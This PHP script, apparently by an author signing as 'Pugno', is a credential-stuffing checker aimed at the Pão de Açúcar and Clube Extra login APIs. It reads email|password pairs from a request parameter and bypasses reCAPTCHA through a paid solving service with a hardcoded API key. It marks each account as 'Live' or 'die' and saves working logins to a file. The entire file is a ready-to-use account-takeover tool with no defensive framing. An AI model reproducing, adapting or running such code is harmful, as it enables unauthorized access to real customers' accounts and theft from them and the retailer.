<?php
/*
*Author: Pugno <pugno_fc>
*/

/*
 _ __ _  _ __ _ _ _  ___ 
| '_ \ || / _` | ' \/ _ \
| .__/\_,_\__, |_||_\___/
|_|       |___/          


Segue meu canal do youtube 

* @𝓐𝓾𝓽𝓱𝓸𝓻   𝓟 𝓾 𝓰 𝓷 𝓸
*
* 𝓒𝓸𝓷𝓽𝓪𝓬𝓽   𝓦𝓱𝓪𝓽𝓼𝓪𝓹𝓹  >>  (21) 97225-9563
* 𝓒𝓸𝓷𝓽𝓪𝓬𝓽   𝓣𝓮𝓵𝓮𝓰𝓻𝓪𝓶  >>  @pugno_fc
*
*/
error_reporting(0);

function getStr($string, $start, $end) {
   $str = explode($start, $string);
   $str = explode($end, $str[1]);  
   return $str[0];
}

function multiexplode($string) {
   $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
   $one = str_replace($delimiters, $delimiters[0], $string);
   $two = explode($delimiters[0], $one);
   return $two;
}
    
function get2Cap($key,$gkey,$pageUrl){

   $curl=curl_init();
   curl_setopt_array($curl,array(CURLOPT_URL => "https://2captcha.com/in.php?key=$key&method=userrecaptcha&googlekey=$gkey&pageurl=$pageUrl&json=1",
       CURLOPT_RETURNTRANSFER => true,
   ));
   $response = curl_exec($curl);
   $id = json_decode($response, true) ["request"];

   while (true)
   {
    usleep(200);

    $curl = curl_init();
    curl_setopt_array($curl, array(CURLOPT_URL => "https://2captcha.com/res.php?key=$key&action=get&id=$id&json=1",
        CURLOPT_RETURNTRANSFER => true,
    ));

    $response = curl_exec($curl);
    $resposta = json_decode($response, true) ["request"];

    if ($resposta != "CAPCHA_NOT_READY")
    {
        return $resposta; 
        break;
    }

}

}

$lista = $_GET['lista'];
$email = multiexplode($lista)[0];
$senha = multiexplode($lista)[1];

$opcao = $_GET['opcao'];
if ($opcao == "paodeacucar") {
    $url = "https://api.gpa.digital/pa/v2/user/login";
    $site = "https://www.paodeacucar.com";

}elseif($opcao == 'clubeextra'){
    $url = "https://api.gpa.digital/ex/v2/user/login";
    $site = "https://www.clubeextra.com.br";
}else{
    exit("Erro no parametro OPCAO");
}


$recaptchaCode = get2Cap('e249192863f7edb5f8ef278335f710d7', '6LfMQmUUAAAAAHdaklwYpClgahIH78afURdkVZvo', $site);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"username":"'.$email.'","password":"'.$senha.'","recaptchaCode":"'.$recaptchaCode.'"}');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array(
    'Host: api.gpa.digital',
    'Accept: application/json, text/plain, */*',
    'Content-Type: application/json',
    'Sec-Ch-Ua-Platform: \"Windows\"',
    'Accept-Language: pt-BR,pt;q=0.9'
);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);

if (strpos($result, '"status":"success"')) {
    $nick = getStr($result, 'nick":"','"');
    $live = "Live $email|$senha|$nick";

    $fp = fopen("pugno-cx7777-$opcao.txt","wb");
    fwrite($fp,$live);
    fclose($fp);
    
    exit("Live $email|$senha|$nick");

}elseif (strpos($result, 'reCaptcha was not successfully validated')) {
    exit("die $email|$senha reCaptcha não resolvido, veja seus creditos.");

}elseif (strpos($result, 'Bad credentials"')) {
  exit("die $email|$senha");

}else{
    exit("Error $email|$senha");
}